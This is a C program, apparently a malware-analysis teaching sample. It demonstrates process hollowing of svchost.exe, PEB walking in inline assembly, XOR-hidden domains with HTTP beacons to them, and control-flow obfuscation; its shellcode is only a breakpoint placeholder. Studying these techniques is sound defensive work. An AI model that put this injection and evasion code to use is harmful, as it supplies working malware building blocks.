// Author: Josh Stroschein @jstrosch
// Date: 22 December 2021
// Description: A program that demonstrates process hollowing and PEB-walking.

#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <winsock.h>

#pragma comment(lib,"wininet.lib")

typedef LONG (NTAPI *pfnZwUnmapViewOfSection)(HANDLE, PVOID);

/*sets up some arrays used for domain names*/
void initialize(void);

/* This is a simple XOR decrypt, used primarily to 'hide' strings in the binary */
void decrypt(char*src, size_t key, size_t size);

void make_http_requests(void);

void control_flow_obfuscation(int argc);

void locate_nt_ldrLoadDll(void);

void process_hollowing_example(void);

char domains[3][25] = {0};

const unsigned int xor_key = 97;

/* Created with msfvenom, null-bytes as bad characters */
char * shellcode_winexec_calc = "\xcc";

int main(int argc, char argv[], char envp[]) {

	initialize();

	control_flow_obfuscation(argc);

	make_http_requests();

	locate_nt_ldrLoadDll();

	process_hollowing_example();
}

void initialize(void) {
	time_t t;

	srand((unsigned) time(&t));

	strcpy(domains[0], "\x09\x15\x15\x11\x5b\x4e\x4e\x51\x19\x04\x17\x08\x0d\x02\x51\x05\x04\x4f\x02\x0e\x0c");
	strcpy(domains[1], "\x09\x15\x15\x11\x5b\x4e\x4e\x05\x12\x14\x4f\x04\x05\x14");
	strcpy(domains[2], "\x09\x15\x15\x11\x5b\x4e\x4e\x0f\x12\x20\x4f\x06\x0e\x17");
}

void decrypt(char *src,size_t key, size_t size) {
	int i = 0;

	for (i = 0; i < size; i++) {
		src[i] ^= key;
	}
}

void make_http_requests(void) {
	size_t i = 0;
	HANDLE internet_handle;

	internet_handle = InternetOpen("Mozilla/4.0 (Lab Environment)",INTERNET_OPEN_TYPE_PRECONFIG,0,0,0);

	for(i = 0; i < 3; i++) {
		decrypt(domains[i], xor_key, strlen(domains[i]));

		if(internet_handle != NULL){
			InternetOpenUrl(internet_handle, domains[i], 0,0,0x84000000,0);
		}
		Sleep(2000);
	}
	InternetCloseHandle(internet_handle);
}

void control_flow_obfuscation(int argc) {
	char st[22] = "ping ";
	char *beg = &st[6];
	char del = ' ';

	if (argc - 1 > 0)
	{
		switch(argc) {
			case 1:
				strcpy(beg, "8.8.8.8");

			break;
			case 2:
				strcpy(beg, "0.0.0.0");
			break;
			case 4:
				puts("error");
		}
	}
}

void locate_nt_ldrLoadDll (void) {

	DWORD dwNtdllBase = 0;
	DWORD dwAddressOfOrdinal = 0;
	DWORD dwAddressOfNames = 0;
	DWORD dwAddressOfFunctions = 0;
	DWORD dwLdrLoadDll = 0;

	char*api = "LdrLoadDll";
	//char*api = "ZwUnmapViewOfSection";
	char * export = {0};
	int i = 0, num_exports = 0, len = 0;

	__asm
	{

		xor ebx, ebx             ; // clear ebx
		mov ebx, fs:[ 0x30 ]     ; // get a pointer to the PEB
		//More information on the PEB: https://msdn.microsoft.com/en-us/library/windows/desktop/aa813706(v=vs.85).aspx
		mov ebx, [ ebx + 0x0C ]  ; // get PEB->Ldr - https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708(v=vs.85).aspx
		mov ebx, [ ebx + 0x1C ]  ; // get PEB->Ldr.InInitializationOrderModuleList.Flink (1st entry)
		mov ebx, [ ebx + 0x08 ]  ; // get the entries base address

		mov dwNtdllBase, ebx

		//find exports via pe file
		xor eax, eax
		mov eax, ebx // Start with image base
		add eax, [ eax + 0x3c ] // get e_lfanew
		mov eax, [ eax + 0x78 ] // get IMAGE_DATA_DIRECTORY->EXPORT
		add eax, ebx //get virutal address for Export

		// get number of exports
		mov esi, [eax + 0x14]
		mov num_exports, esi

		mov edx, [ eax + 0x20] // get addressofnames RVA
		add edx, ebx // adjust to get VA
		mov dwAddressOfNames, edx //store for later use

		mov edx, [ eax + 0x1C] // Get AddressOfFunctions RVA
		add edx, ebx //adjust to get RVA
		mov dwAddressOfFunctions, edx //store for later use

		mov edx, [ eax + 0x24] // AddressOfOrdinal RVA
		add edx, ebx // adjust to get VA
		mov dwAddressOfOrdinal, edx

		//Iterates AddressOfNames (ASCII name of export)
		mov edx, dwAddressOfNames

		mov ecx, 0xA //maximimum length we need to search TODO: change if you want to search a longer export name
		xor eax, eax //this will be used to index the AddressOfFunction array once we find the export
	next_name:
		inc eax
		mov esi, [edx]
		add esi, ebx // VA of ENT

		add edx, 0x4 //increment to next array element (next function name)

		mov edi, api //string we want to compare
		cld
		push ecx
		push esi
		push eax
		repe cmpsb
		pop eax
		pop esi
		pop ecx

		jne next_name //jump if no match, if match continue to find ordinal then function address

		dec eax

		mov edx, dwAddressOfOrdinal
		movzx eax, word ptr [eax*2+edx] //ordinal of function, note the size

		mov ecx, dwAddressOfFunctions
		mov ecx, [eax*4+ecx]
		add ecx, ebx
		mov dwLdrLoadDll, ecx
	}
	//printf("[*] Found %s 0x%08x\n",api, dwLdrLoadDll);
	//printf("[*] Found %d exports\n", num_exports);
}

void process_hollowing_example(void) {

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};
	CONTEXT c = {0};
	void*targetProcessMemory = {0};

	char*target_exe = TEXT("c:\\Windows\\System32\\svchost.exe");

	if (CreateProcess(target_exe,NULL,NULL,NULL,FALSE,0x4, NULL, NULL, &si, &pi) == 0) {
		puts("[!] CreateProcess failed");
	} else {
		puts("[*] Process Created");
	}
	GetThreadContext(pi.hThread, &c);
	//Could also use the locate_nt_ldrLoadDll function to return function pointers 
	HANDLE ntdllBase = GetModuleHandleA("ntdll.dll");
	pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(ntdllBase,"ZwUnmapViewOfSection");
    //This expects the code to be loaded at the default image base of 0x400000, if the module/exe is using ASLR than it will be different.
    // One solution is to identify the load address and adjust accordingly.
	pZwUnmapViewOfSection( pi.hProcess, 0x400000);
	targetProcessMemory = VirtualAllocEx(pi.hProcess, 0x400000, 0x220, 0x3000, 0x40);

	if(targetProcessMemory == NULL) {
		//Just to help with debugging
		puts("[!] Allocation failed");
	}

	if(WriteProcessMemory(pi.hProcess, targetProcessMemory, shellcode_winexec_calc, 220, NULL) == 0) {
		//Just to help with debugging
		puts("[!] Failed to write new code");
	}

	c.Eax = (DWORD)targetProcessMemory;
	c.ContextFlags = CONTEXT_INTEGER;

	SetThreadContext(pi.hThread, &c);

	ResumeThread(pi.hThread);
}
